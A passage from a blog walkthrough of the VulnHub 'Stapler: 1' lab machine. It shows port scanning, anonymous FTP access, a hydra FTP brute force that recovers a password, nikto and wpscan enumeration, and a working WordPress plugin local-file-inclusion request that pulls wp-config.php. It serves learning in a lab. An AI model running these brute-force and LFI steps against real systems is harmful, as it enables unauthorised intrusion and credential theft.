
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>[VulnHub] Stapler: 1  | F4l13n5n0w</title>

<meta name="author" content="F4l13n5n0w"> 

<meta name="description" content="This is a description"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
<h4>Info Security & Pen Testing learning notes</h4>
<nav id="main-nav"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner"><article class="post">
	<h2 class="title">[VulnHub] Stapler: 1</h2>
	<div class="entry-content"><p>This is made for BsidesLondon 2016 with average beginner/intermediate difficulty and a few twists :) Also multiple attacking vectors and paths to get shell and ROOT. Author is <a href="https://www.vulnhub.com/author/g0tmi1k,21/">g0tmi1k</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/stapler-1,150/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Stapler: 1 (<em>10.1.1.138/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>FTP service allow Anonymous login</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>WEB application Full Path Disclosure</li>
<li><a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress plugin LFI vulnerability to read sensitive informtion</li>
<li>Connect to target server&rsquo;s MySQL service as root and write reverse PHP web shell</li>
<li>Connect to target server&rsquo;s MySQL service and download <code>wp_users</code> table which username and password hash saved in</li>
<li>Crack WordPress administrator/editor account and login to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.138    00:0c:29:b4:04:59   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:e8:0a:52   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.283 seconds <span class="o">(</span>112.13 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.138</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# masscan -p1-65535 10.1.1.138/32 --rate<span class="o">=</span><span class="m">10000</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f <span class="m">4</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tee 138_masscan.txt
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-08-12 11:19:28 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'><span class="m">12380</span>
</span><span class='line'>22
</span><span class='line'>21
</span><span class='line'>53
</span><span class='line'>3306
</span><span class='line'>666
</span><span class='line'>80
</span><span class='line'>
</span><span class='line'>root@kali:~/myExercises/stapler# tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> &lt; 138_masscan.txt
</span><span class='line'>12380,22,21,53,3306,666,80,root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.138
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>21/tcp    open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_Can<span class="s1">&#39;t get directory listing: Can&#39;</span>t parse PASV response: <span class="s2">&quot;Permission denied.&quot;</span>
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>53/tcp    open  domain  dnsmasq 2.75
</span><span class='line'><span class="p">|</span> dns-nsid:
</span><span class='line'><span class="p">|</span>_  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open  http
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-title: <span class="m">404</span> Not Found
</span><span class='line'>666/tcp   open  doom?
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span>   Thread ID: 8440
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: LongPassword, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, ODBCClient, InteractiveClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, FoundRows
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>_  Salt: <span class="s1">&#39;pw|)\x07ib\x0ByIS3P&lt;Y^jO\x10</span>
</span><span class='line'><span class="s1">12380/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
</span><span class='line'><span class="s1">| http-methods: </span>
</span><span class='line'><span class="s1">|_  Supported Methods: GET HEAD POST OPTIONS</span>
</span><span class='line'><span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)</span>
</span><span class='line'><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open and Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# ftp 10.1.1.138
</span><span class='line'>Connected to 10.1.1.138.
</span><span class='line'>220-
</span><span class='line'>220-<span class="p">|</span>-----------------------------------------------------------------------------------------<span class="p">|</span>
</span><span class='line'>220-<span class="p">|</span> Harry, make sure to update the banner when you get a chance to show who has access here <span class="p">|</span>
</span><span class='line'>220-<span class="p">|</span>-----------------------------------------------------------------------------------------<span class="p">|</span>
</span><span class='line'>220-
</span><span class='line'><span class="m">220</span>
</span><span class='line'>Name <span class="o">(</span>10.1.1.138:root<span class="o">)</span>: anonymous
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">107</span> Jun <span class="m">03</span> 23:06 note
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'><span class="nb">local</span>: note remote: note
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note <span class="o">(</span><span class="m">107</span> bytes<span class="o">)</span>.
</span><span class='line'><span class="m">226</span> Transfer complete.
</span><span class='line'><span class="m">107</span> bytes received in 0.01 secs <span class="o">(</span>14.1935 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@kali:~/myExercises/stapler# cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are <span class="k">done</span>, John.
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure>


<p>From the <code>note</code> file, I know that <code>elly</code> is a ftp user and there could be something about payload stored in her FTP folder.</p>

<p>Then I did a quick FTP login brute force attack against to user <code>elly</code> by using <code>hydra</code> with parameter <code>-e nsr</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# hydra -l elly -e nsr ftp://10.1.1.138
</span><span class='line'>Hydra v8.2 <span class="o">(</span>c<span class="o">)</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-08-15 22:56:07
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.138   login: elly   password: ylle
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2016-08-15 22:56:11
</span></code></pre></td></tr></table></div></figure>


<p>Great! <code>elly</code>&rsquo;s password is <font color="red"><code>ylle</code></font></p>

<p>Login as <code>elly</code> and found that the home directory is <code>/etc/</code>, so I downloaded the file <code>passwd</code> and <code>vsftpd.conf</code>.</p>

<p>So far, nothing else found, so I decided to move on.</p>

<p>port 12380 is open and running HTTP with SSL. so I did a <code>nikto</code> scan against port 12380</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.138
</span><span class='line'>+ Target Port: 12380
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;dave&#39;</span> found, with contents: Soemthing doesn<span class="s1">&#39;t look right here</span>
</span><span class='line'><span class="s1">+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
</span><span class='line'><span class="s1">+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
</span><span class='line'><span class="s1">+ GET Entry &#39;</span>/admin112233/<span class="s1">&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span>
</span><span class='line'><span class="s1">+ GET Entry &#39;</span>/blogblog/<span class="s1">&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span>
</span><span class='line'><span class="s1">+ GET &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span>
</span><span class='line'><span class="s1">+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span>
</span><span class='line'><span class="s1">+ GET Uncommon header &#39;</span>x-ob_mode<span class="err">&#39;</span> found, with contents: 1
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure>


<p>From the nikto scan, we found that WEB server on port 12380 is a HTTPS service and there are three hidden directories <code>/admin112233</code>, <code>/blogblog</code> and <code>/phpmyadmin</code>.</p>

<p>so I checked them one by one, and 1st one is <code>/admin112233</code>, but this is a XSS hook page :(</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k https://10.1.1.138:12380/admin112233/
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;mwwhahahah&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;noscript&gt;Give yourself a cookie! Javascript didn<span class="err">&#39;</span>t <span class="nv">run</span> <span class="o">=)</span>&lt;/noscript&gt;
</span><span class='line'>&lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span>&gt;window.alert<span class="o">(</span><span class="s2">&quot;This could of been a BeEF-XSS hook ;)&quot;</span><span class="o">)</span><span class="p">;</span>window.location<span class="o">=</span><span class="s2">&quot;http://www.xss-payloads.com/&quot;</span><span class="p">;</span>&lt;/script&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>2nd one is <code>/blogblog</code>, and it&rsquo;s using <code>WordPress CMS</code>.</p>

<p>so next, I run <code>wpscan</code> and found one plugin which is vulnerable to <a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We found <span class="m">4</span> plugins:
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> <span class="p">|</span>  Latest version: 1.0 <span class="o">(</span>up to date<span class="o">)</span>
</span><span class='line'> <span class="p">|</span>  Location: https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'> <span class="p">|</span>  Readme: https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Directory listing is enabled: https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Also I use <code>wpscan</code> to enumerate available users and got the following result:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+----+---------+-----------------+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login   <span class="p">|</span> Name            <span class="p">|</span>
</span><span class='line'>    +----+---------+-----------------+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> john    <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> elly    <span class="p">|</span> Elly Jones      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> peter   <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> barry   <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> heather <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">6</span>  <span class="p">|</span> garry   <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">7</span>  <span class="p">|</span> harry   <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">8</span>  <span class="p">|</span> scott   <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">9</span>  <span class="p">|</span> kathy   <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim     <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'>    +----+---------+-----------------+
</span></code></pre></td></tr></table></div></figure>


<p>By exploiting the Local File Inclusion vulnerability, <code>https://10.1.1.138:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php</code></p>

<p><img class="left" src="/downloads/stapler/1.png"></p>

<p>Then, back to home page and check the frontpage by right clicking and choose <code>Inspect Element (Q)</code>. Then find the thumbnail file location which is <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg</code> in this case.</p>

<p><img class="left" src="/downloads/stapler/2.png"></p>

<p>Then I use <code>curl</code> to download the thumbnail file and save it to my attacking machine.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg &gt; 1.jpeg
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'><span class="m">100</span>  <span class="m">3042</span>  <span class="m">100</span>  <span class="m">3042</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">7509</span>      <span class="m">0</span> --:--:-- --:--:-- --:--:--  7529
</span></code></pre></td></tr></table></div></figure>


<p>Then checking the file <code>1.jepg</code> which actually is the <code>wp-config.php</code> file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# strings 1.jpeg
</span><span class='line'>&lt;?php
</span><span class='line'> * The base configurations of the WordPress.
</span><span class='line'> * This file has the following configurations: MySQL settings, Table Prefix,
</span><span class='line'> * Secret Keys, and ABSPATH. You can find more information by visiting
</span><span class='line'> * <span class="o">{</span>@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php<span class="o">}</span>
